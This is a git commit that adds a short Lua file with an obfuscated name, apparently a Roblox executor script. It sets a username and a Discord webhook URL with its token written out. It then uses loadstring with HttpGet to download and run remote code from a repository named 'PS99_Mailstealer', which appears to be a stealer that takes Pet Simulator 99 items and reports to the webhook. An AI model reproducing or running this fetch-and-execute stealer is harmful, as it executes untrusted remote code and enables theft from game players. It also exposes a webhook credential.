4c4c6a191f13d9ae303f29ded294d65ad110ceed
rohandev2009 <134789904+rohandev2009@users.noreply.github.com>
2024-09-09 16:43:57 +0530

    Add files via upload

---
+++ obf_f6Z77m2q791Gt4Oa0qm8AeGU3v6ouZtl32ODI0YlleGCkpYnNb19xB063lRgLY2y.lua
@@ -0,0 +1,5 @@
+Username = "prorohanitsme"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1282647833572278353/GadCiiAyk8oRBzCm1_k_EchM9M4BVAHpgs9B5FTymwDTrAVk1DmR_q1Bv9DZIO8i06dZ" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
